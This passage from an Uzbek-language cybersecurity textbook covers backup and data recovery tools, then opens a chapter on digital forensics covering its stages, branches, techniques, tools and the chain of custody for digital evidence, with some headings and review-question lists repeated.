Bundan tashqari, Acronis, Veeam, Macrium Reflect, Cobian Backup kabi dasturlar yordamidan foydalanish mumkin.
Agar ishchi stansiyalar server bo‘lsa, unda RAID texnologiyasi asosida zaxira nusxalashni amalga oshiradilar. RAID texnologiyasida amallarni samarali bajarish uchun 6 ta sath mavjud: RAID 0, RAID 1, RAID 3, RAID 5, RAID 10 va RAID 50. Bularning har biri o‘ziga xos xususiyatlarga ega.
Ma’lumotlarni qayta tiklash
Ma’lumotlarning yo‘qolishi har qanday tashkilot uchun jiddiy muammo hisoblanadi. Shu sababli, ma’lumotlarni qayta tiklash usullaridan foydalanish talab etiladi. Ushbu jarayon ma’lumotlarning qanday yo‘qolganiga, ma’lumotlarni qayta tiklash dasturiy vositasiga va ma’lumotlarni tiklash manziliga bog‘liq. 
Ma’lumotlarni eltish vositalarida, USB xotirada, qattiq diskda, DVD va boshqa saqlagichlarda ma’lumotlarni qayta tiklash mumkin. Qayta tiklash jarayonining muvaffaqqiyatli amalga oshirilishi foydalanuvchining malakasiga bog‘liq. Ma’lumotlarni qayta tiklash jarayonida bilim va to‘g‘ri tanlangan vosita muhim hisoblanadi.
Ma’lumotlarni qayta tiklash har doim ham muvaffaqiyatli bo‘lmasligi mumkin. Agar saqlagichda xatolik mavjud bo‘lsa yoki unga ko‘p zarar yetgan bo‘lsa, ma’lumotlarni tiklashning imkoni bo‘lmasligi mumkin. Ma’lumotlarning qayta tiklanishi ehtimoli ularning yo‘qolishi sababiga bog‘liq. Ma’lumotlarni yo‘qolishiga sabab bo‘luvchi hollar quyidagilar:
Faylni o‘chirish: agar fayl o‘chirilsa, ushbu soha qaytadan yozilgunga qadar saqlagichda mavjud bo‘ladi. Ma’lumotlar saqlangan sohadagi kichik xotiraga ma’lumotlar yozilishi butun ma’lumotlarni tiklanmasligiga sababchi bo‘lishi mumkin. Windows OTda NTFS fayl tizimida ma’lumotlarni o‘chirish algoritmi mavjud va ma’lumotlarni tiklash ham ushbu algoritm asosida amalga oshiriladi.
Faylning zararlanishi: agar OT zararlansa, ma’lumotlarni diskning qismlar jadvali yordamida tiklash mumkin. Agar diskning qismlar jadvali ham zararlangan bo‘lsa, qayta tiklashning maxsus vositalaridan foydalanishga to‘g‘ri keladi.
Qattiq diskning fizik zararlanishi: qattiq diskka fizik ta’sir bo‘lishi, faylni zararlanishiga qaraganda, katta yo‘qotishlarga sabab bo‘lishi mumkin. Bu esa ma’lumotlarni qayta tiklashning maxsus sathidan foydalanishni talab etadi. Zararlangan fizik diskdan ma’lumotlarni tiklash vaqtida, tiklash jarayonining muhiti turli ifloslanishlardan holi bo‘lishi zarur. Ya’ni, bu jarayon toza xonada amalga oshirilishi shart. Chang bo‘lgan sohalarda ma’lumotlarning qayta tiklanishi qiyin bo‘ladi. 
Ma’lumotlarni qayta tiklashda quyidagilarni esda saqlash zarur:
	•	ma’lumotlar yo‘qolgan qattiq diskga qayta tiklangan ma’lumotlarni yozmaslik;
	•	turli zaxira nusxalarni amalga oshirish va ularni turli manzillarda saqlash;
	•	ma’lumotlarni qayta tiklash har doim ham 100% samara bermasligi.
Amalda saqlagichlardagi yo‘qolgan ma’lumotlarni tiklashda maxsus dasturiy vositalardan foydalaniladi. Ularga Recovery My Files, EASEUS Data Recovery Wizard, Advanced Disk Recovery, Handy Recovery, R-Studio, Data Recovery Pro, Recuva, Total Recall, Pandora Recovery kabilarni misol sifatida keltirish mumkin.
	Ransomware nima va u qanday ishlaydi?
	•	Ransomware hujumlarining asosiy tarqalish usullari qaysilar?
	•	Nima uchun 3-2-1 qoidasi zaxira nusxalashda eng ishonchli strategiya hisoblanadi?
	•	Ma’lumotlarni tiklash (data recovery) jarayoni qanday bosqichlardan iborat?
	•	Ransomwarega qarshi kurashishda endpoint himoyasi qanday rol o‘ynaydi?
	•	Zaxira nusxani doimiy ulanib qo‘yish qanday xavflarni tug‘diradi?
	•	Ransomware hujumidan so‘ng ma’lumotlarni tiklashda qanday imkoniyatlar mavjud?
	•	Phishing xabarlari ransomware tarqalishiga qanday hissa qo‘shadi?
Nazorat savollari
	•	Ransomware nima va u qanday ishlaydi?
	•	Ransomware hujumlarining asosiy tarqalish usullari qaysilar?
	•	Nima uchun 3-2-1 qoidasi zaxira nusxalashda eng ishonchli strategiya hisoblanadi?
	•	Ma’lumotlarni tiklash (data recovery) jarayoni qanday bosqichlardan iborat?
	•	Ransomwarega qarshi kurashishda endpoint himoyasi qanday rol o‘ynaydi?
	•	Zaxira nusxani doimiy ulanib qo‘yish qanday xavflarni tug‘diradi?
	•	Ransomware hujumidan so‘ng ma’lumotlarni tiklashda qanday imkoniyatlar mavjud?
	•	Phishing xabarlari ransomware tarqalishiga qanday hissa qo‘shadi?
Nazorat savollari

IX BOB. RAQAMLI KRIMINALISTIKA VA INSIDENTLARGA JAVOB BERISH

IX BOB. RAQAMLI KRIMINALISTIKA VA INSIDENTLARGA JAVOB BERISH






Ta’lim maqsadlari:
–	raqamli kriminalistika (digital forensics) tushunchasini va kiberhodisadan keyingi tergov jarayonining bosqichlarini tushuntiradi;
–	Chain of Custody tamoyillarini ta’riflaydi hamda raqamli dalillar yaxlitligini saqlashning ahamiyatini asoslaydi;
–	maxsus vositalar yordamida kriminalistik tasvir (image) yaratadi va original ma’lumotlarning o‘zgarmasligini ta’minlaydi;
–	namunaviy disklar asosida o‘chirilgan fayllarni tiklaydi va tiklangan ma’lumotlarni tahlil qiladi;
–	vaqt bo‘yicha (Timeline) tahlil orqali tizimdagi hodisalarni ketma-ketlikda qayta tiklaydi;
–	turli manbalardan olingan loglarni birlashtiradi va hujum vaqt jadvalini aniqlaydi;
–	xotira kriminalistikasi (memory forensics) asoslarini tushuntiradi hamda RAMdan dalil olishning afzalliklarini izohlaydi;
–	dasturiy vositalar yordamida xotira dumpini tahlil qiladi, shubhali jarayonlar va artefaktlarni aniqlaydi;
–	ichki tahdid belgilarini aniqlaydi va tergov natijalarini professional insident hisoboti ko‘rinishida rasmiylashtiradi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Inzidentlarga reaksiya va raqamli kriminalistika (Реагирование на инциденты и цифровая криминалистика) - https://www.coursera.org/learn/ibm-incident-response-digital-forensics 
2. Kiberxavfsizlik: Raqamli kriminalistika (Cyber Security: Digital Forensics) - https://www.coursera.org/learn/cyber-security-digital-forensics 
9-bob haqida umumiy ma’lumot
Mazkur bobda raqamli kriminalistika asoslari, uning muhimligi, asosiy bosqichlari, raqamli dalillarni saqlash zanjiri, qayd jurnali va vaqt jadvalini tahlillash, xotira kriminalistikasiga oid nazariy va amaliy ma’lumotlar keltirilgan.


9.1. Raqamli kriminalistikaga kirish  (Ma’ruza mashg‘uloti)

1. Kiberjinoyat amalga oshirilganidan so‘ng jarayonni tadqiq etish. 
2. Raqamli kriminalistikaning muhimligi. 
3. Uning asosi bosqichlari: ma’lumotlarni to‘plash, o‘rganish, ma’lumotlarni tahlillash, hisobot yozish. 
4. Raqamli kriminalistika vositalari. 
5. Asosiy sohalari.
Reja:
1. Kiberjinoyat amalga oshirilganidan so‘ng jarayonni tadqiq etish. 
2. Raqamli kriminalistikaning muhimligi. 
3. Uning asosi bosqichlari: ma’lumotlarni to‘plash, o‘rganish, ma’lumotlarni tahlillash, hisobot yozish. 
4. Raqamli kriminalistika vositalari. 
5. Asosiy sohalari.
Reja:

Raqamli kriminalistika (Digital Forensics), Dalillar zanjiri (Chain of Custody), Kompyuter kriminalistikasi (Computer Forensics), Jonli tahlil (Live Analysis), O‘chirilgan fayllarni tiklash (Deleted File Recovery / File Carving), Tarmoq kriminalistikasi (Network Forensics), Stoxastik kriminalistika (Stochastic Forensics), Raqamli xavflar (Digital Risks / Cybersecurity Risks)
Kalit so‘zlar
Raqamli kriminalistika (Digital Forensics), Dalillar zanjiri (Chain of Custody), Kompyuter kriminalistikasi (Computer Forensics), Jonli tahlil (Live Analysis), O‘chirilgan fayllarni tiklash (Deleted File Recovery / File Carving), Tarmoq kriminalistikasi (Network Forensics), Stoxastik kriminalistika (Stochastic Forensics), Raqamli xavflar (Digital Risks / Cybersecurity Risks)
Kalit so‘zlar
Kiberjinoyat amalga oshirilganidan so‘ng jarayonni tadqiq etish
Raqamli kriminalistika (Digital forensics) — bu raqamli dalillarni yig‘ish va tahlil qilish jarayoni bo‘lib, ularning yaxlitligi va sudda qabul qilinishini ta’minlaydi.
Raqamli kriminalistika - sud ekspertizasining bir yo‘nalishi. U asosan kiberjinoyatlarni tergov qilishda qo‘llanadi, biroq jinoyat va fuqaroviy ishlarni tekshirishda ham yordam berishi mumkin. Masalan, kiberxavfsizlik jamoalari raqamli kriminalistikadan zararli dastur (malware) hujumi ortida turgan kiberjinoyatchilarni aniqlashda foydalanishi mumkin. Huquqni muhofaza qiluvchi organlar esa qotillikda gumon qilinuvchining qurilmalaridagi ma’lumotlarni tahlil qilish uchun undan foydalanadi.
Raqamli kriminalistikaning qo‘llanish sohasi keng, chunki u raqamli dalillarni boshqa har qanday dalil turi kabi ko‘rib chiqadi. Masalan, hodisa joyidan jismoniy dalillarni to‘plashda mutaxassislar maxsus tartib-qoidalarga amal qiladi. Xuddi shuningdek, raqamli kriminalistika ekspertlari dalillarni to‘g‘ri yig‘ish, ularni o‘zgartirish yoki buzilishdan himoya qilish uchun “custody chain”, ya’ni dalilni topshirish qatoriga oid qat’iy protseduralarga amal qiladilar (bu haqida keyingi mavzuda to‘xtalib o‘tiladi).
Raqamli kriminalistikaning muhim qismi - bu gumon qilingan kiberhujumlarni tahlil qilish bo‘lib, uning maqsadi kiber tahdidlarni aniqlash, yumshatish va butunlay yo‘q qilishdan iborat. Shu sababli raqamli kriminalistika hodisalarga javob berish jarayonining (incident response) ajralmas qismi hisoblanadi. Shuningdek, u hujumdan keyingi bosqichda ham foydali bo‘lib, auditorlar, yuridik jamoalar yoki huquqni muhofaza qiluvchi organlar talab qiladigan ma’lumotlarni taqdim etishga yordam beradi.
Elektron dalillar bir qancha manbalardan to‘planishi mumkin, jumladan kompyuterlar, mobil qurilmalar, masofaviy saqlash qurilmalari, buyumlar interneti (IoT) qurilmalari, deyarli istalgan boshqa kompyuterlashtirilgan tizimlar bo‘lishi mumkin.
Raqamli kriminalistikaning muhimligi
Raqamli kriminalistika odatda faqat raqamli va kompyuter muhitlari bilan cheklangandek tasavvur qilinadi. Ammo aslida uning jamiyatga ta’siri bundan ancha kengroqdir. Chunki kompyuterlar va kompyuterlashtirilgan qurilmalar hayotning deyarli barcha jabhalarida qo‘llanayotgani sababli, raqamli dalillar nafaqat kiberolamda, balki real dunyodagi turli jinoyatlar va huquqiy masalalarni hal qilishda ham muhim ahamiyat kasb etmoqda.
Internetga ulangan barcha qurilmalar ulkan hajmdagi ma’lumotlarni yaratadi. Ko‘plab qurilmalar foydalanuvchilarning barcha harakatlarini, shuningdek, qurilma tomonidan mustaqil ravishda bajariladigan tarmoqqa ulanish yoki ma’lumot uzatish kabi jarayonlarni qayd etib boradi. Bunga avtomobillar, mobil telefonlar, routerlar, shaxsiy kompyuterlar, svetoforlar va xususiy hamda jamoat sohalaridagi boshqa ko‘plab qurilmalar kiradi.
Raqamli dalillar quyidagi jinoyatlarda va tergov jarayonlarida dalil sifatida qo‘llanilishi mumkin:
Ma’lumot o‘g‘irlanishi va tarmoq buzilishlari - raqamli kriminalistika buzilish qanday sodir bo‘lganini va hujumchilar kimligini aniqlashda qo‘llanadi.
Onlayn firibgarlik va shaxsiylikni o‘g‘irlash (identity theft) - raqamli kriminalistika buzilishning tashkilot va mijozlarga ko‘rsatgan ta’sirini aniqlashga yordam beradi.
Zo‘ravonlik, qotillik kabi zo‘ravonlik jinoyatlar - jinoyat sodir bo‘lgan joy atrofidagi mobil telefonlar, avtomobillar yoki boshqa qurilmalardan raqamli dalillar yig‘iladi.
Oq yoqali jinoyatlar - korporativ firibgarlik, o‘zlashtirish, tovlamachilik kabi jinoyatlarni aniqlash va isbotlash uchun raqamli kriminalistikadan foydalaniladi.
Tashkilotlar kontekstida raqamli kriminalistika kiberxavfsizlik hodisalarini ham, jismoniy xavfsizlik bilan bog‘liq hodisalarni ham aniqlash va tekshirishda qo‘llanadi. Eng ko‘p uchraydigan holatlarda raqamli dalillar buzilishni aniqlash, uning asl sababini va tahdid manbasini topish, tahdidni bartaraf etish hamda yuridik organlar uchun zarur dalillarni taqdim etish maqsadida insidentlarga javob berish (incident response) jarayonining bir qismi sifatida ishlatiladi.
Raqamli kriminalistikani samarali amalga oshirish uchun tashkilotlar loglar va boshqa raqamli dalillarni markazlashtirilgan tarzda boshqarishi, ularni yetarli muddat saqlashi va har qanday soxtalashtirish, zararli foydalanish yoki tasodifiy yo‘qotishdan himoya qilishi kerak.
Raqamli xavflarni aniqlash
Tashkilotlar murakkab va o‘zaro bog‘langan ta’minot zanjirlaridan (bir nechta mijozlar, hamkorlar va dasturiy ta’minot yetkazib beruvchilarni o‘z ichiga olgan tizimlardan) foydalanar ekan, ular o‘z raqamli aktivlarini turli hujumlarga ochib qo‘yadi. Shuningdek, ular murakkab IT infratuzilmalaridan foydalanadi: korxona ichidagi va mobil qurilmalar, bulutga asoslangan xizmatlar hamda konteynerlar kabi bulutga xos texnologiyalar. Natijada yangi va keng qamrovli hujum yuzasi paydo bo‘ladi.
Raqamli xavflarni quyidagi toifalarga bo‘lish mumkin:
Kiberxavfsizlik xavfi - maxfiy ma’lumotlarga yoki tizimlardan ruxsatsiz foydalanish va ularni zararli maqsadlarda (tovlamachilik, sabotaj va boshqalar) ishlatishga qaratilgan hujumlar.
Muvofiqlik (compliance) xavfi - tartibga solinadigan muhitda ishlatilayotgan texnologiya tufayli paydo bo‘ladigan xavf. Masalan, ba’zi texnologiyalar ma’lumotlar maxfiyligi talablarini buzishi yoki xavfsizlik standartida talab etiladigan nazorat vositalariga ega bo‘lmasligi mumkin.
Uchinchi tomon (third-party) xavflari - tashqi xizmat ko‘rsatuvchi yoki yetkazib beruvchilarga bog‘liq holda yuzaga keladigan xavflar. Masalan, intellektual mulk, ma’lumotlar, operatsion jarayonlar, moliyaviy ma’lumotlar, mijozlarga oid ma’lumotlar yoki uchinchi tomonlar bilan bo‘lishiladigan boshqa muhim axborotdagi zaifliklar.
Identifikatsiya (identity) xavfi - foydalanuvchi akkauntlarini egallash yoki maxfiy ma’lumotlarni o‘g‘irlashga qaratilgan hujumlar. Bunday xavf tashkilotning o‘z ichki akkauntlariga ham, mijozlar nomidan boshqariladigan akkauntlariga ham tahdid soladi.
Asosiy sohalari
Quyida raqamli kriminalistikaning asosiy sohalari haqida ma’lumotlar berilgan:
Kompyuter kriminalistikasi (Computer Forensics)
Kompyuter kriminalistikasi kompyuterlar va raqamli saqlash qurilmalaridagi dalillarni o‘rganadi. Bu jarayon tekshirilayotgan ma’lumotlarni aniqlash, saqlab qolish, tiklash, tahlil qilish va ularni faktlar va xulosalar ko‘rinishida taqdim etishni o‘z ichiga oladi.
Kompyuter kriminalistikasida ma’lumotlarni tiklashga o‘xshash usullar qo‘llanadi, ammo unga qo‘shimcha ravishda huquqiy audit izini yaratadigan, dalilning “custody chain”ini aniq yuritishga doir protseduralar ham mavjud.
Mobil qurilmalar kriminalistikasi (Mobile Device Forensics)
Mobil qurilmalar kriminalistikasi asosan mobil qurilmalardan raqamli dalillarni tiklash bilan shug‘ullanadi. Tahlil jarayoni ichki xotira va aloqa funksiyasiga ega bo‘lgan istalgan qurilmani qamrab oladi: mobil telefonlar, PDA qurilmalar, planshetlar, GPS qurilmalari va boshqalar.
Tarmoq kriminalistikasi (Network Forensics)
Tarmoq kriminalistikasi tarmoq faoliyatini monitoring qilish, qayd etish va tahlil qilish bilan shug‘ullanadi. Tarmoq ma’lumotlari juda dinamik va tez o‘zgaruvchan bo‘ladi, uzatilganidan keyin esa uni qayta olish imkoni bo‘lmaydi. Shu sababli tarmoq kriminalistikasi odatda proaktiv tergov jarayoni hisoblanadi.
Kriminalistik ma’lumotlar tahlili (Forensic Data Analysis, FDA)
FDA ilova tizimlari va ma’lumotlar bazalarida saqlanadigan tuzilgan (structured) ma’lumotlarni moliyaviy jinoyatlar kontekstida tahlil qiladi. Uning maqsadi firibgarlik faoliyatining shablonlarini aniqlash va ularni chuqur o‘rganishdir.
Ma’lumotlar bazasi kriminalistikasi (Database Forensics)
Ma’lumotlar bazasi kriminalistikasi ma’lumotlar bazasiga kirish jarayonlarini va undagi o‘zgarishlarni tahlil qiladi. Uni turli maqsadlarda qo‘llash mumkin. Masalan, firibgarlikni ko‘rsatadigan ma’lumotlar bazasi tranzaksiyalarini aniqlash uchun foydalanish mumkin. Bundan tashqari, tahlildan maqsad ma’lumotlar bazasidagi satr (row) yangilangan vaqtga tegishli vaqt tamg‘alarini tekshirishga qaratilishi ham mumkin. Bunday tergov ma’lumotlari bazasining haqiqiyligini tasdiqlash va muayyan foydalanuvchining amallarini tekshirishga yordam beradi.
Uning asosi bosqichlari
Raqamli kriminalistika jarayoni turli holatlarda biroz farq qilishi mumkin. Biroq odatda to‘rtta asosiy bosqichdan iborat bo‘ladi: yig‘ish, tekshirish, tahlil va hisobot tayyorlash.
1. Yig‘ish (Collection)
Bu bosqichda raqamli dalillar olinadi, odatda kompyuterlar, qattiq disklar yoki telefonlar kabi fizik qurilmalar musodara qilinadi. Jarayon davomida ma’lumot yo‘qolmasligi yoki shikastlanmasligi juda muhim. Buning oldini olish uchun saqlash vositalarining nusxasi olinadi yoki asl ma’lumot tashuvchilarning tasviri (image) yaratiladi.
2. Tekshirish (Examination)
Bu bosqich ma’lumotlarni aniqlash va ajratib olishni o‘z ichiga oladi. Uni uch qismga bo‘lish mumkin: tayyorlash, ajratib olish va aniqlash.
Tayyorlashda, ma’lumotni jonli (live) yoki o‘chirilgan (dead) tizimdan olishga qaror qilinadi. Masalan, noutbukni yoqib jonli tizim sifatida tekshirish yoki qattiq diskni laboratoriya kompyuteriga ulab tahlil qilish.
Aniqlash bosqichida, tergov uchun qaysi ma’lumotlar muhim ekanini belgilash kerak. Masalan, sud orderi tekshiruvni faqat ma’lum fayllar yoki ma’lumotlarga cheklashi mumkin.
3. Tahlil (Analysis)
Bu bosqichda to‘plangan ma’lumotlar ekspertlar tomonidan tuzilgan ishni tasdiqlash yoki rad etish uchun o‘rganiladi. Bunda quyidagi muhim savollarga javob topishga harakat qilinadi:
	•	Ma’lumotni kim yaratgan?
	•	Ma’lumotni kim o‘zgartirgan?
	•	Ma’lumot qanday yaratilgan?
	•	Bu harakatlar qachon sodir bo‘lgan?
Shuningdek, ekspertlar ma’lumotlar tergov qilinayotgan ish bilan qanday bog‘liqligini ham aniqlaydi.
4. Hisobot tayyorlash (Reporting)
Bu bosqichda ma’lumotlar va tahlil natijalari oddiy odamlar tushunishi mumkin bo‘lgan shaklga keltiriladi. Hisobotlar juda muhim, chunki ular barcha manfaatdor tomonlarga (sud, tergovchilar, yuridik mutaxassislar va boshqalar) ma’lumotni aniq yetkazishga yordam beradi.
Raqamli kriminalistikaning asosiy usullari
Raqamli kriminalistika buzilgan (komprometlangan) qurilmaning nusxasini yaratish va keyin turli usul va vositalar yordamida ma’lumotlarni tekshirish jarayonini o‘z ichiga oladi. Bu usullar ajratilmagan disk bo‘shlig‘i, yashirin papkalar va shifrlangan, shikastlangan yoki o‘chirib yuborilgan fayllarning izlarini aniqlashda yordam beradi. Quyida keng qo‘llaniladigan usullar keltirilgan:
Teskari steganografiya (Reverse Steganography)
Kiberjinoyatchilar steganografiyani ma’lumotni raqamli fayllar, xabarlar yoki ma’lumot oqimlari ichiga yashirish uchun ishlatadi. Teskari steganografiya esa fayldagi xesh yoki boshqa raqamli izlarni tahlil qilish orqali yashirin ma’lumotni aniqlashga qaratilgan. Raqamli rasm yoki fayl ichidagi yashirin ma’lumot tashqi ko‘rinishda sezilmasligi mumkin, ammo u faylning ichki xesh qiymati yoki ma’lumot satrlarini o‘zgartiradi.
Stoxastik kriminalistika (Stochastic Forensics)
Ushbu texnika raqamli artefaktlar qoldirmaydigan faoliyatni tahlil qilish va qayta tiklashga yordam beradi. Raqamli artefakt - bu raqamli jarayon natijasida paydo bo‘ladigan ma’lumotlardagi o‘zgartirish. Masalan, matn fayllari ma’lumot o‘g‘irlash kabi jinoyatlarda fayl atributlari o‘zgargani tufayli artefakt bo‘lib xizmat qilishi mumkin. Stoxastik kriminalistika ayniqsa ichki xodimlar tomonidan amalga oshirilgan hujumlarni aniqlashda foydali bo‘lib, ular ko‘pincha artefakt qoldirmaydi.
Disklararo tahlil (Cross-drive Analysis)
Disklararo tahlil, shuningdek anomaliyani aniqlash deb ham ataladi, tergov uchun kontekst yaratadigan o‘xshashliklarni topishga yordam beradi. Ushbu o‘xshashliklar shubhali holatlarni aniqlash uchun asos sifatida xizmat qiladi. Usul bir nechta kompyuter disklaridagi ma’lumotlarni solishtirish, bog‘lash va tahlil qilish orqali tergov uchun ahamiyatli ma’lumotlarni aniqlashni o‘z ichiga oladi.
Jonli tahlil (Live Analysis)
Jonli tahlil qurilma yoki kompyuter ishlayotgan vaqtda, operatsion tizim faol bo‘lgan holatda amalga oshiriladi. Bu jarayonda tizim vositalaridan foydalanib, odatda operativ xotira (RAM) yoki keshda saqlanadigan ma’lumotlar aniqlanadi, tahlil qilinadi va ajratib olinadi. Jonli tahlil tergov izchilligi (chain of custody) buzilmasligi uchun tekshirilayotgan qurilmani maxsus kriminalistika laboratoriyasida saqlashni talab qiladi.
O‘chirilgan fayllarni tiklash (Deleted File Recovery)
O‘chirilgan fayllarni tiklash, data carving yoki file carving deb ham ataladi, qurilmadan o‘chirib tashlangan fayllarni qayta tiklash usulidir. Bu usul faylning bir qismi o‘chirilgan bo‘lsada, boshqa joylarda uning izlari qolgan bo‘lishi mumkin bo‘lgan xotira hududlarini qidirishga asoslanadi. Jarayon kompyuter tizimi va xotirasidan fayl bo‘laklarini topib, ularni qayta yig‘ishni o‘z ichiga oladi.
Raqamli kriminalistika vositalari
Raqamli kriminalistika vositalari paydo bo‘lmasidan avval, tergovchilar dalillarni olish va jonli tahlil qilish uchun mavjud tizim administratorlari vositalaridan foydalanishga majbur edi. Bu usulning kamchiligi shundaki, u diskdagi ma’lumotlarning o‘zgarishiga olib kelishi va dalillarni soxtalashtirish xavfini tug‘dirishi mumkin edi.
1989-yilda AQSHning Federal huquqni muhofaza qilish organlari o‘quv markazi (Federal Law Enforcement Training Center) ehtiyojni tan oldi va SafeBack hamda IMDUMP vositalarini yaratdi. 1991-yilda esa apparat/dasturiy ta’minot kombinatsiyasidan iborat DIBS nomli yechim sotuvga chiqarildi. Bu vositalar test va tergov uchun raqamli vositalarning aynan bir xil nusxalarini yaratib, asl disklarni buzilmagan holda saqlab qolish imkonini berdi.
1990-yillarning oxiriga kelib, ishonchli raqamli dalillarga bo‘lgan talab oshgani sababli FTK va EnCase kabi yanada takomillashgan vositalar ishlab chiqildi. Ular tahlilchilarga jonli tahlilga ehtiyoj sezmasdan, media nusxalari ustida tergov olib borish imkonini berdi.
Bugungi kunda yo‘nalish jonli xotira tahliliga mo‘ljallangan vositalar, masalan, WindowsSCOPE yoki mobil operatsion tizimlarni qo‘llovchi maxsus vositalarga qarab rivojlanmoqda. CAINE va EnCase kabi tijorat platformalari keng imkoniyatlarga ega, shuningdek kriminalistika uchun maxsus tayyorlangan Linux distributivlari mavjud. Ochiq manbali vositalar ham keng qo‘llanilmoqda, masalan, paketlarni tahlil qilish uchun Wireshark va ma’lumotlar bazalarini tahlil qilishni tezlashtiruvchi HashKeeper.
Raqamli kriminalistika vositalarining asosiy turlari:
	•	Disk/ma’lumotlarni nusxalash vositalari;
	•	Fayllarni ko‘rish vositalari;
	•	Tarmoq va ma’lumotlar bazasi kriminalistikasi vositalari;
	•	Fayl, reyestr, web, elektron pochta va mobil qurilmalarni tahlil qilishga ixtisoslashgan vositalar.
Raqamli kriminalistika yechimlarini baholashda quyidagilarga e’tibor berish lozim:
	•	Mavjud kriminalistika imkoniyatlari bilan integratsiya va ularni kengaytirish darajasi;
	•	Turli qurilmalar va fayl formatlari uchun qo‘llab-quvvatlash mavjudligi;
	•	Xodimlar mahsulotdan foydalana olishi uchun treyninglar mavjudligi;
	•	CLI, grafik interfeys va foydalanish qulayligi;
	•	Qo‘shimcha integratsiyalar yoki plaginlar bilan moslik;
	•	Tizim konfiguratsiyalari turlari;
	•	Samaraliroq tahlil uchun ilg‘or funksiyalarga ega ekanligiga.
	Raqamli kriminalistikaning asosiy bosqichlari nimalardan iborat?
	•	Dalillar zanjiri (chain of custody) nima va u nega sud jarayonida juda muhim?
	•	Kompyuter kriminalistikasi va mobil qurilmalar kriminalistikasi o‘rtasidagi farqlar nimalardan iborat?
	•	Jonli tahlil (live analysis) qachon qo‘llanadi va uning afzallik hamda xavflari nimalar?
	•	O‘chirilgan fayllarni tiklash (file carving) texnikasi qanday ishlaydi va qanday maqsadlarda qo‘llaniladi?
	•	Teskari steganografiya va stoxastik kriminalistika usullari nimani aniqlashga yordam beradi?
	•	Raqamli xavflarning asosiy toifalarini tushuntiring?
	•	Raqamli kriminalistika vositalarini baholashda qaysi mezonlar e’tiborga olinadi?
Nazorat savollari
	•	Raqamli kriminalistikaning asosiy bosqichlari nimalardan iborat?
	•	Dalillar zanjiri (chain of custody) nima va u nega sud jarayonida juda muhim?
	•	Kompyuter kriminalistikasi va mobil qurilmalar kriminalistikasi o‘rtasidagi farqlar nimalardan iborat?
	•	Jonli tahlil (live analysis) qachon qo‘llanadi va uning afzallik hamda xavflari nimalar?
	•	O‘chirilgan fayllarni tiklash (file carving) texnikasi qanday ishlaydi va qanday maqsadlarda qo‘llaniladi?
	•	Teskari steganografiya va stoxastik kriminalistika usullari nimani aniqlashga yordam beradi?
	•	Raqamli xavflarning asosiy toifalarini tushuntiring?
	•	Raqamli kriminalistika vositalarini baholashda qaysi mezonlar e’tiborga olinadi?
Nazorat savollari

9.2. Raqamli dalillarni saqlash zanjiri  (Ma’ruza mashg‘uloti)

1. Raqamli dalillarni saqlash zanjiri: muhimligi, dalillarni saqlashdagi murakkabliklar. 
2. Dalillarni saqlash zanjiri shakllantirish bo‘yicha tavsiyalar. 
Reja:
1. Raqamli dalillarni saqlash zanjiri: muhimligi, dalillarni saqlashdagi murakkabliklar. 
2. Dalillarni saqlash zanjiri shakllantirish bo‘yicha tavsiyalar. 
Reja:

Dalillarni saqlash zanjiri (Custody Chain, CoC), Raqamli dalillar yaxlitligi (Digital Integrity), Xesh qiymatlari (Hash Values), Audit jurnali (Audit Log), Forensik nusxa (Forensic Copy), Bulut asosidagi dalillar (Cloud Evidence), ISO/IEC 27037:2012, Ruxsatsiz foydalanish (Unauthorized Access).
Kalit so‘zlar:
Dalillarni saqlash zanjiri (Custody Chain, CoC), Raqamli dalillar yaxlitligi (Digital Integrity), Xesh qiymatlari (Hash Values), Audit jurnali (Audit Log), Forensik nusxa (Forensic Copy), Bulut asosidagi dalillar (Cloud Evidence), ISO/IEC 27037:2012, Ruxsatsiz foydalanish (Unauthorized Access).
Kalit so‘zlar:
Raqamli dalillarni saqlash zanjiri: muhimligi, dalillarni saqlashdagi murakkabliklar
Hozirgi kunda raqamli kriminalistika ko‘plab surishtiruvlarning muhim qismiga aylangan. Biroq, har qanday raqamli dalil sudda huquqiy kuchga ega bo‘lishi uchun u to‘g‘ri aniqlanishi, yig‘ilishi, saqlanishi va hujjatlashtirilishi shart. Ana shu jarayonda dalillarni saqlash zanjiri (Custody Chain, CoC) - kiberkriminalistika tekshiruvlarining asosiy tayanchlaridan biri sifatida namayon bo‘ladi. CoC - bu dalillarni yig‘ishdan tortib arxivlashgacha bo‘lgan to‘plash, boshqarish, uzatish va saqlash jarayonlarini kuzatib boruvchi hujjatdir.
Raqamli davrda dalillarni o‘zgartirish juda oson bo‘lib qoldi, shu sababli to‘g‘ri yuritilgan CoC yanada muhimlashmoqda. Agar CoC buzilsa yoki noto‘g‘ri boshqarilsa, dalillar sud tomonidan qabul qilinmasligi mumkin va bu butun ishni xavf ostiga qo‘yadi. 
CoC nima va u nima uchun muhim?
CoC - bu (raqamli) dalillarni boshqarish jarayonini xronologik tartibda hujjatlashtirish usuli. Dalil yig‘ilgan ilk ondan boshlab u bir shaxsdan boshqasiga topshirilgan har bir bosqich qayd etiladi; bu esa dalilga ruxsatsiz hech kim kira olmaganini yoki egalik qila olmaganini isbotlashga xizmat qiladi. Ma’lumotni qanday aniqlangani, yig‘ilgani, tashilgani, tahlil qilingani va taqdim etish uchun qanday saqlangani haqida hujjatlar bo‘lishi kerak.
CoC kriminalistik tekshiruvlar uchun ayniqsa muhim, chunki raqamli dalillar tashqi omillarga juda sezgir. Boshqacha aytganda bu “raqamli yaxlitlik” tushunchasi bilan bog‘liq: “Ruxsatsiz tarzda o‘zgartirilmagan, ya’ni yaratilgan, uzatilgan yoki vakolatli manba tomonidan saqlangan paytdan boshlab o‘z holatini saqlab qolgan raqamli ma’lumot xususiyati.”
CoCning asosiy maqsadi - dalilning haqiqiyligini ta’minlash, yaxlitligini saqlash, sudga yaroqliligini kafolatlash va mas’uliyatni belgilashdir. Birinchidan, yaxshi yuritilgan CoC dalil o‘zgartirilmaganini va dastlabki holatda qolganini isbotlaydi. 
Ikkinchidan, raqamli dalillar oson o‘zgartirilishi mumkin bo‘lganligi sababli, hech qanday o‘zgarish bo‘lmaganini va ruxsatsiz foydalanish yoki manipulyatsiya sodir bo‘lmaganini ta’minlaydigan aniq ko‘rsatmalar bo‘lishi kerak. Dalilga kirish va topshirishlar bo‘yicha to‘g‘ri yuritilgan jurnal uning yaxlitligini himoya qiladi.
